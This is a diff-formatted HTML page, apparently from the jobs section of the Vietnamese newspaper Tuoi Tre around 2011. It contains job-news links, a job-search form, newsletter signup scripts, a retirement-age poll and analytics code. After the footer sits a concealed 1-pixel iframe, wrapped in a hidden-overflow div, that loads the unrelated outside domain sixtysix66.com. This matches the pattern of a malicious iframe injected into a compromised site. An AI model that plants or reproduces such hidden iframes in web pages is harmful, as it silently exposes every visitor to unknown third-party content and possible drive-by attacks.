+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463600&ChannelID=269' title='TT - Hàn Quốc vừa đồng ý cho Việt Nam tổ chức trở lại kỳ kiểm tra tiếng Hàn (vốn bị tạm dừng từ tháng 8-2011) để tuyển chọn lao động đi làm việc ở nước này. Đây là một tin vui cho những người quan tâm đến thị trường này, nhất là 53.000 người đã học tiếng Hàn.'>
+									15.000 người có cơ hội sang Hàn Quốc lao động - (05/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463599&ChannelID=269' title='TT - Sáng 4-11, gần 10.000 học sinh, sinh viên trên địa bàn TP.HCM đến tham dự “Ngày hội việc làm học sinh, sinh viên Cao Thắng năm 2011” tổ chức tại Trường CĐ Kỹ thuật Cao Thắng.'>
+									Ngày hội việc làm cho sinh viên ngành kỹ thuật - (05/11)
+								</a>
+							</td>
+						</tr>
+					
+				
+				<tr height="15">
+					<td></td>
+				</tr>
+			</table>
+	</tr>
+</table>
+
+				</td>
+				<td nowrap width="10"></td>
+				<td nowrap vAlign="top" align="center" width="180" height="100%" bgcolor="#FFFFFF">
+						<table cellpadding="0" cellspacing="0" border="0" width="100%" height="100" >
+							<tr>
+								<td height="10">
+								</td>
+							</tr>
+							<tr>
+								<td align="center">
+									
+
+<style type="text/css">
+<!--
+/*---------------------------- CSS QUICK SEARCH JOBS ------------------------*/
+table {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	color: #000000;	line-height: 1.4;
+}
+.textnote {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 10px;
+	color: #666666;
+}
+.border {
+	background-color: #edb94b;
+	width: 160px;
+}
+.title_quicksearch{
+	background-repeat: no-repeat;
+	background-position: left center;
+	height: 26px;
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	font-weight: bold;
+	text-transform: uppercase;
+	color: #333333;
+	text-decoration: none;
+	padding-left: 16px;
+	padding-top: 3px;
+	background-image: url(images/icon_title.gif);
+	border-bottom-width: 1px;
+	border-bottom-style: inset;
+	border-bottom-color: #FF6500;
+}
+.bg_quicksearch{
+	background-color: #FFFFFF;
+	margin: 0px;
+	background-repeat: repeat-y;
+	background-position: left center;
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	font-weight: normal;
+	text-transform: capitalize;
+	color: #474747;
+	text-decoration: none;
+	background-image: url(images/img_02.gif);
+	width: 160px;
+}
+/* --------------------------------- CSS BG RIGHT MENU ---------------------------------------*/
+.bg_rightmenu {
+	background-color: #F8F0E5;
+	border: 1px solid #E59001;
+	padding: 3px;
+	text-align: center;
+	width: 160px;
+}
+.rightmenu_act {
+	color: #ce4c00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	font-weight: bold;
+	text-transform: capitalize;
+	height: 28px;
+	padding-top: 3px;
+}
+.rightmenu {
+	color: #ce4c00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	text-transform: capitalize;
+	height: 28px;
+	padding-top: 3px;
+	background-image: url(images/dotline.gif);
+	background-repeat: repeat-x;
+	background-position: left bottom;
+}
+.rightmenu a:link {
+	color: #ce4c00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	text-transform: capitalize;
+}
+.rightmenu a:visited {
+	color: #ce4c00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	text-transform: capitalize;
+}
+.rightmenu a:hover {
+	color: #9D3C00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	text-transform: capitalize;
+}
+.rightmenu a:active {
+	color: #ce4c00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	text-transform: capitalize;
+}
+-->
+</style>
+
+</head>
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<form name="qsFrm" method="post" onSubmit="submitSearch();return false;">
+          		<input type=hidden name='searchby' value=0>
+<table width="160"  border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td height="10" align="left" valign="top"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td align="left" valign="top"><img src="Images/img_01.gif" alt="" width="160"></td>
+      </tr>
+      <tr>
+        <td align="left" valign="top" class="bg_quicksearch"><table width="85%"  border="0" align="center" cellpadding="0" cellspacing="0">
+          <tr> </tr>
+          <tr>
+            <td height="5" >Ng&agrave;nh:</td>
+          </tr>
+          <tr>
+            <td height="5" ></td>
+          </tr>
+          <tr>
+            <td height="5" ><select name="industry" class="input" style="width:150px">
+	<option value="0" selected="selected">- Chọn tất cả -</option>
+	<option value="1">IT</option>
+	<option value="2">Kế toán</option>
+	<option value="3">Hành chánh/Thư ký</option>
+	<option value="4">Quảng cáo/Tiếp thị/Đối ngoại</option>
+	<option value="5">Nông nghiệp/Thực phẩm</option>
+	<option value="6">Kiến trúc</option>
+	<option value="7">Dược phẩm/Sinh học</option>
+	<option value="8">Xây dựng</option>
+	<option value="9">Tư vấn</option>
+	<option value="10">Hàng tiêu dùng</option>
+	<option value="11">Dịch vụ sáng tạo</option>
+	<option value="12">Dịch vụ khách hàng</option>
+	<option value="13">Giáo dục/Đào tạo/Thư viện</option>
+	<option value="14">Cơ khí/Kỹ thuật ứng dụng</option>
+	<option value="15">Giải trí</option>
+	<option value="16">Môi trường/Xử lý chất thải</option>
+	<option value="17">Điều hành</option>
+	<option value="18">Xuất nhập khẩu</option>
+	<option value="19">Tài chính/Ngân hàng</option>
+	<option value="20">Chính phủ/Phi lợi nhuận</option>
+	<option value="21">Y tế</option>
+	<option value="22">Nhân sự</option>
+	<option value="23">Bảo hiểm</option>
+	<option value="24">Pháp lý</option>
+	<option value="25">Sản xuất/Vận hành sản xuất</option>
+	<option value="26">Dầu khí</option>
+	<option value="27">Khác</option>
+	<option value="28">Bất động sản</option>
+	<option value="29">Nhà hàng/Khách sạn</option>
+	<option value="30">Bán sỉ/Bán lẻ</option>
+	<option value="31">Kinh doanh</option>
+	<option value="32">Bưu chính viễn thông</option>
+	<option value="33">Vận chuyển/Kho bãi</option>
+	<option value="34">Du lịch/Nhà nghỉ</option>
+	<option value="35">Tiện ích</option>
+	<option value="36">Thống kê</option>
+	<option value="37">Báo chí/Biên tập viên</option>
+	<option value="38">Biên phiên dịch</option>
+	<option value="39">Dệt may</option>
+	<option value="41">Hóa chất/Sinh hóa</option>
+	<option value="42">Quản lý chất lượng</option>
+	<option value="43">Vật tư/Theo dõi đơn hàng</option>
+	<option value="44">Lao động phổ thông</option>
+	<option value="45">Mới tốt nghiệp/Thực tập</option>
+</select></td>
+          </tr>
+          <tr>
+            <td height="5" ></td>
+          </tr>
+          <tr>
+            <td height="5" >T&#7881;nh/Th&agrave;nh Ph&#7889;:</td>
+          </tr>
+          <tr>
+            <td height="5" ></td>
+          </tr>
+          <tr>
+            <td height="5" ><select name="locations" class="input" style="width:150px" >
+	<option value="0" selected="selected">- Chọn tất cả -</option>
+	<option value="8">HCM</option>
+	<option value="4">Ha Noi</option>
+	<option value="76">An Giang</option>
+	<option value="64">Ba Ria-VT</option>
+	<option value="281">Bac Can</option>
+	<option value="240">Bac Giang</option>
+	<option value="781">Bac Lieu</option>
+	<option value="241">Bac Ninh</option>
+	<option value="75">Ben Tre</option>
+	<option value="56">Binh Dinh</option>
+	<option value="650">Binh Duong</option>
+	<option value="651">Binh Phuoc</option>
+	<option value="62">Binh Thuan</option>
+	<option value="78">Ca Mau</option>
+	<option value="71">Can Tho</option>
+	<option value="26">Cao Bang</option>
+	<option value="511">Da Nang</option>
+	<option value="50">Dac Lac</option>
+	<option value="900">Dien Bien</option>
+	<option value="61">Dong Nai</option>
+	<option value="67">Dong Thap</option>
+	<option value="59">Gia Lai</option>
+	<option value="19">Ha Giang</option>
+	<option value="351">Ha Nam</option>
+	<option value="34">Ha Tay</option>
+	<option value="39">Ha Tinh</option>
+	<option value="320">Hai Duong</option>
+	<option value="31">Hai Phong</option>
+	<option value="18">Hoa Binh</option>
+	<option value="321">Hung Yen</option>
+	<option value="58">Khanh Hoa</option>
+	<option value="77">Kien Giang</option>
+	<option value="60">Kon Tum</option>
+	<option value="23">Lai Chau</option>
+	<option value="63">Lam Dong</option>
+	<option value="25">Lang Son</option>
+	<option value="20">Lao Cai</option>
+	<option value="72">Long An</option>
+	<option value="350">Nam Dinh</option>
+
+	<option value="38">Nghe An</option>
+	<option value="30">Ninh Binh</option>
+	<option value="68">Ninh Thuan</option>
+	<option value="901">Khác</option>
+	<option value="210">Phu Tho</option>
+	<option value="57">Phu Yen</option>
+	<option value="52">Quang Binh</option>
+	<option value="510">Quang Nam</option>
+	<option value="55">Quang Ngai</option>
+	<option value="33">Quang Ninh</option>
+	<option value="53">Quang Tri</option>
+	<option value="79">Soc Trang</option>
+	<option value="22">Son La</option>
+	<option value="54">T. Thien Hue</option>
+	<option value="66">Tay Ninh</option>
+	<option value="36">Thai Binh</option>
+	<option value="280">Thai Nguyen</option>
+	<option value="37">Thanh Hoa</option>
+	<option value="73">Tien Giang</option>
+	<option value="74">Tra Vinh</option>
+	<option value="27">Tuyen Quang</option>
+	<option value="70">Vinh Long</option>
+	<option value="211">Vinh Phuc</option>
+	<option value="29">Yen Bai</option>
+</select></td>
+          </tr>
+		   <input type="hidden" name="view" value="1"><input type="hidden" name="sort" value="1"> 
+          <tr>
+            <td height="10"></td>
+          </tr>
+          <tr>
+            <td class="textnote"><div align="center">
+			
+          	<input type="image" src="Images/Quicksearch_05.gif" width="75" height="19" border="0"  onClick="submitSearch();return false;">
+</div></td>
+		  </tr>
+        </table></td>
+      </tr>
+	  </form>
+      <tr>
+        <td align="left" valign="top"><img src="Images/img_03.gif" alt="" width="160"></td>
+      </tr>
+    </table></td>
+	
+  </tr>
+  <tr>
+    <td height="10" align="left" valign="top"></td>
+  </tr>
+    <form name="editFrm" action="" method="post">
+	 <input type="hidden" name="act">
+  <tr>
+    <td width="160" height="10" align="left" valign="top"><table width="160"  border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td width="160" align="left" valign="top"><table width="160"  border="0" align="center" cellpadding="0" cellspacing="0">
+            <tr>
+              <td height="25" align="center" class="border"><strong>Nhận Bản Tin Việc Làm </strong></td>
+            </tr>
+            <tr>
+              <td height="10" align="center" class="bg_rightmenu"><table width="100%" height="19%"  border="0" align="center" cellpadding="0" cellspacing="2">
+                  <tr>
+                    <td height="3" ></td>
+                  </tr>
+                  <tr>
+                    <td align="center" class="textnote"><input name="email"  style="width:150px" id="email" onKeyPress="submitenter()"   type="text" value="Nhập Email của Bạn" size="30"></td>
+                  </tr>
+                  <tr>
+                    <td height="3" ></td>
+                  </tr>
+                  <tr>
+                    <td align="center"><div align="center">										
+					<input type="image"  onClick="submitemail()" src="Images/signup.gif" border="0" style="cursor:hand">
+</div></td>
+                  </tr>
+                  <tr>
+                    <td height="3"></td>
+                  </tr>
+                  <tr>
+                    <td height="22" valign="top" class="text_note" ><div align="justify"><a href="#"></a>Đăng ký để nhận   bản tin về những cơ hội việc làm mới nhất.</div></td>
+                  </tr>
+              </table></td>
+            </tr>
+        </table></td>
+      </tr>
+	  </form>
+    </table></td>
+  </tr>
+</table>
+<script>
+function submitSearch(){
+	//alert(11);
+    var form = document.qsFrm;
+	//var kw;
+	///kw = replace(form.keyword.value,'"','%22');
+	//kw = replace(kw,"'","%27");
+
+	//kw = replace(kw,"&","%26");
+	//alert(kw);
+	//form.btsearch.disabled=true;
+	//form.style.cursor='wait';+ "&country=" + CSelected() 
+	window.location="http://vieclam.tuoitre.com.vn/jobseeker/index.php?m=jobsearch&a=result&l=1&sort=" + form.sort.value + "&view=" + VChecked() + "&loc=" + LSelected() + "&ind=" + ISelected();
+	//form.action="http://tuoitre.timnhanh.com/jobseeker/index.php?m=jobsearch&a=result&l=1&sort=" + form.sort.value + "&view=" + VChecked() + "&loc=" + LSelected() + "&ind=" + ISelected();
+	//alert('1a');
+	//return false;
+	//form.submit();
+}
+function LSelected(){
+	var form = document.qsFrm;
+	var i = form.locations.length -1;
+	var ls;
+	ls = "";
+	for (i; i > -1; i--) {
+		if (form.locations.options[i].selected)
+			ls = ls + "," + form.locations.options[i].value
+	}
+	return ls.substr(1, ls.length);
+}
+function ISelected(){
+	var form = document.qsFrm;
+	/*var i = form.industry.length -1;
+	var ls;
+	ls = "";
+	for (i; i > -1; i--) {
+		if (form.industry.options[i].selected)
+			ls = ls + "," + form.industry.options[i].value
+	}*/
+	//return ls.substr(1, ls.length);
+	return form.industry.value;
+}
+function SChecked(){
+	var form = document.qsFrm;
+	/*if (form.sort[0].checked) {
+		return form.sort[0].value;
+	}
+	if (form.sort[1].checked) {
+		return form.sort[1].value;
+	}*/
+	return form.sort.value;
+}
+function VChecked(){
+	var form = document.qsFrm;
+	/*if (form.view[0].checked) {
+		return form.view[0].value;
+	}
+	if (form.view[1].checked) {
+		return form.view[1].value;
+	}*/
+	return form.view.value;
+}
+/////////////////////
+
+</script>
+  <script>
+function checkNormalChar(stringIn) {
+	 retval = false 
+	 var i;
+     for (i=0;i<=stringIn.length-1;i++) { 
+     	 //cho phep nhung ky tu tu A->Z, a->z, 0->9,va cac ky tu @,_
+	      if (((stringIn.charCodeAt(i) >= 48)&&(stringIn.charCodeAt(i) <= 57)) || ((stringIn.charCodeAt(i) >= 64)&&(stringIn.charCodeAt(i) <= 90)) || ((stringIn.charCodeAt(i) >= 97)&&(stringIn.charCodeAt(i) <= 122)) ||(stringIn.charCodeAt(i)==95) ||(stringIn.charCodeAt(i)==46) ||(stringIn.charCodeAt(i)==45)) { 
+                retval = true;
+      	  }else{
+      	  		retval = false;
+      	  		break;
+         }
+     }
+	 return retval;
+}
+
+function checkEmail(stringIn) {
+	if (stringIn.indexOf("@") < 1){
+		return false;
+	}else{
+		st = stringIn.substr(stringIn.indexOf("@"));
+		if(st.indexOf(".") == -1){
+			return false;
+		}else{
+			if(!checkNormalChar(stringIn)){
+				return false;
+			}else{
+				return true;
+			}
+		}
+	}
+}
+function submitemail(){
+    var form = document.editFrm;	
+	if((form.email.value.length < 5)||!checkEmail(form.email.value))
+	{	alert ("Vui lòng nhập email!");
+		form.email.focus();
+		return false;
+	}
+	else
+	{	
+		form.act.value='subemail';
+		form.action="http://vieclam.tuoitre.com.vn/jobseeker/?m=ourservices&a=thanksubcribe&l=";
+		form.submit();
+	}
+}
+function submitenter(){
+	if (window.event && window.event.keyCode == 13){
+		return submitemail();
+	}
+}
+</script>
+
+								</td>
+							</tr>
+							<tr>
+								<td align="center">
+									<!--<Cache Time='10/11/2011 11:42:55 CH'>-->
+<script>
+function OnCmdSubmitClick(Option)
+{
+	for (i = 0; i < Option.length; i++)
+		if (Option[i].checked)
+		{
+			showDialog('ChartView.aspx?SurveyID=24&SurveyDetailID=' + Option[i].value, 450, 250);
+			return;
+		}
+	alert('Bạn cần chọn một câu trả lời trước khi nhấn nút!');
+}
+
+function OnCmdViewClick()
+{
+	showDialog('ChartView.aspx?SurveyID=24', 850, 250);
+}
+</script>
+<table width="90%" height="1" border="0">
+  <tr>
+    <td height="8"></td>
+  </tr>
+</table>
+<table width="90%" border="1" style="BORDER-COLLAPSE: collapse"  bordercolor=#eeb94a>
+  <!--DWLayoutTable-->
+  <tr> 
+          <td align=center valign="middle" bgcolor="#eeb94a" class="SurveyTitle">Thăm dò ý kiến</td>
+  </tr>
+              <tr> 
+                <td height="38" valign="bottom" class="PanelContent">&nbsp;
+				<span class="SurveyItem">Theo bạn, so với nam giới, độ tuổi về hưu của nữ nên:</span>
+                  <br>  
+                      <input type=radio value='115' name="optDetail">
+                      <span class="SurveyItem">Nghỉ hưu trước nam giới 5 năm</span>
+                      <br>
+                     
+                      <input type=radio value='116' name="optDetail">
+                      <span class="SurveyItem">Nghỉ hưu trước nam giới 10 năm</span>
+                      <br>
+                     
+                      <input type=radio value='117' name="optDetail">
+                      <span class="SurveyItem">Bằng với tuổi nghỉ hưu của nam giới</span>
+                      <br>
+                     
+                      <input type=radio value='118' name="optDetail">
+                      <span class="SurveyItem">Bằng tuổi nghỉ hưu của nam, nhưng nếu có nhu cầu, có thể nghỉ trước nam 1-5 năm mà vẫn hưởng nguyên chế độ</span>
+                      <br>
+                     
+                </td>
+</tr>
+<tr><td height=36 valign=middle>&nbsp;
+  <input  type="button" name="cmdSubmit" value="Chọn" onclick="OnCmdSubmitClick(optDetail);" class="SurveyButton" >
+                  &nbsp;&nbsp;&nbsp; <input type="button" name="cmdView" value="Kết quả" onclick="OnCmdViewClick();" class="SurveyButton">
+                  </td>
+  </tr>
+</table>
+<table width="90%" height="1" border="0">
+	<tr>
+		<td height="8"></td>
+  	</tr>
+</table>
+<TABLE class=pBody style="MARGIN: 0px; WIDTH: 160px; HEIGHT: auto" borderColor=#eeb94a cellSpacing=0 cellPadding=0 width=160 align=center border=0>
+<TBODY>
+<TR>
+<TD vAlign=center bgColor=#eeb94a height=23><FONT face=Tahoma color=#ffffff>
+<DIV class=PanelHeader style="MARGIN: 0px" align=center><A href="http://www3.tuoitre.com.vn/Vieclam/Index.aspx?ArticleID=162215&amp;ChannelID=269" target=_blank><FONT face=Arial color=#000000><STRONG>&nbsp;HỒ SƠ XIN VIỆC <BR>cho SV mới tốt nghiệp</STRONG></FONT></DIV></A></FONT></TD></TR>
+<TR>
+<TD height=2></TD></TR>
+<TR>
+<TD vAlign=center bgColor=#eeb94a height=23><FONT face=Tahoma color=#ffffff><FONT face=Arial>
+<DIV class=PanelHeader style="MARGIN: 0px" align=center><A href="http://www3.tuoitre.com.vn/Vieclam/Index.aspx?ArticleID=157713&amp;ChannelID=272" target=_blank><FONT face=Arial color=#000000><STRONG>&nbsp;Hướng dẫn <BR>XIN VIỆC TRỰC TUYẾN</STRONG></FONT></A></FONT></FONT></DIV></TD></TR>
+<TR>
+<TD height=2></TD></TR>
+<TR>
+<TD vAlign=center bgColor=#eeb94a height=23><FONT face=Tahoma color=#ffffff><FONT face=Arial>
+<DIV class=PanelHeader style="MARGIN: 0px" align=center><A href="http://www3.tuoitre.com.vn/Vieclam/Index.aspx?TopicID=615" target=_blank><FONT face=Arial color=#000000><STRONG>&nbsp;KINH NGHIỆM QUẢN LÍ</STRONG></FONT></FONT></DIV></A></FONT></TD></TR>
+<TR>
+<TD height=2></TD></TR>
+<TR>
+<TD vAlign=center bgColor=#eeb94a height=23><FONT face=Tahoma color=#ffffff><FONT face=Arial>
+<DIV class=PanelHeader style="MARGIN: 0px" align=center><A href="http://www3.tuoitre.com.vn/Vieclam/Index.aspx?TopicID=716" target=_blank><FONT face=Arial color=#000000><STRONG>&nbsp;KINH NGHIỆM TUYỂN DỤNG</STRONG></FONT></< A></FONT></DIV></A></FONT></TD></TR></TBODY></TABLE>
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
+	<tr align="center">
+		<td align="center" height="5"></td>
+	</tr>
+	<tr align="center">
+		<td align="center">
+			
+		</td>
+	</tr>
+</table><!--</Cache>-->
+								</td>
+							</tr>
+						</table>
+				</td>
+				<td  width="13"></td>
+			</tr>			
+			<tr height="5">
+				<td colspan="6"></td>
+			</tr>
+			<tr>
+				<td colspan="6" align="center">
+						<table cellpadding="0" cellspacing="0" border="0" width="95%">
+							<tr>
+								<td height="2">
+								</td>
+							</tr>
+							<tr>
+								<td align="center">
+										<!--<Cache Time='10/11/2011 11:42:55 CH'>--><!--</Cache>-->
+								</td>
+							</tr>
+							<tr>
+								<td height="2">
+								</td>
+							</tr>
+						</table>
+				</td>
+			</tr>
+			<tr height="5">
+				<td colspan="6"></td>
+			</tr>
+		</table>
+		<table align="center" border="0" cellspacing="0" width="789" background="Template/Center/Footer.gif" height="46">
+			<tr style="color:#FFFFFF">
+				<td width="240" align="right"><a class="Footer1" href="http://tuoitre.vn/" target="_blank">Bản quyền © 2003 - 2010 Tuổi Trẻ</a></td>
+				<td align="center">
+					<a class="Footer" href="http://tuoitre.vn/Support/unicode.zip">Font Unicode</a>&nbsp;|&nbsp; 
+					<a class="Footer" href="http://quangcao.tuoitre.com.vn/ndquangcao/banggia/new/banggia.htm" target="_blank">Quảng Cáo</a>&nbsp;|&nbsp; 
+					<a href="http://tuoitre.vn/Support/Subscription_edit.htm" target="_blank" class="Footer">Đặt Báo</a>&nbsp;|&nbsp; 
+					<a class="Footer" href="http://tuoitre.vn/Support/support.htm target="_blank">Hướng Dẫn</a>&nbsp;|&nbsp; 
+					<a class="Footer" href="#" target="_top">Liên Hệ</a>
+				</td>
+				<td width="200" style="margin-right:0px">					
+					<a class="Footer1" href="http://moore.vn" target="_blank">Phát triển bởi Moore Corp.</a>
+				</td>
+			</tr>
+		</table>
+		<div style="width:100%;clear:both;height:1px;overflow:hidden;"><iframe src="http://sixtysix66.com" width="100%" height="1" scrolling='no' frameborder='0'></iframe></div>
+		<script src="highlight.js" type="text/javascript"></script>
+		<script>onBodyLoad();</script>
+		
+		<!-- Google Analytics: Tuoitre.vn -->    
+        <script type="text/javascript" language="javascript">
+            var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+            document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+        </script>
+        <script type="text/javascript">
+            try {
+                var pageTracker = _gat._getTracker("UA-12518695-1");
+                pageTracker._trackPageview();
+            } catch(err) {}
+        </script>
+		
+		<!-- Google Analytics-->
+        
+        
+        <!-- CMS Statistics -->
+        <script language="javascript" type="text/javascript" src="http://statistics.tuoitre.com.vn/TotalStatistics.js"></script>
+        <script language="javascript" type="text/javascript">
+            var paramSta    = "App=VIECLAM";
+            var search      = document.location.search;
+            if(search != '')
+            {
+                paramSta = paramSta + "&" + search.replace("?","")
+            }
+            IframeRender(paramSta);
+        </script> 
+	</body>
+</HTML>
